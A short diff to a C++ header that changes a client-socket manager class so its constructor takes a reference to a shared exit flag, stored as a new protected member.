@@ -15,9 +15,10 @@
 class CManager
 {
     friend class CClientSocket;
-
+protected:
+    BOOL& g_bExit;
 public:
-    CManager(CClientSocket *pClient);
+    CManager(CClientSocket *pClient, BOOL& bExit);
     virtual ~CManager();
     virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
     int Send(LPBYTE lpData, UINT nSize);
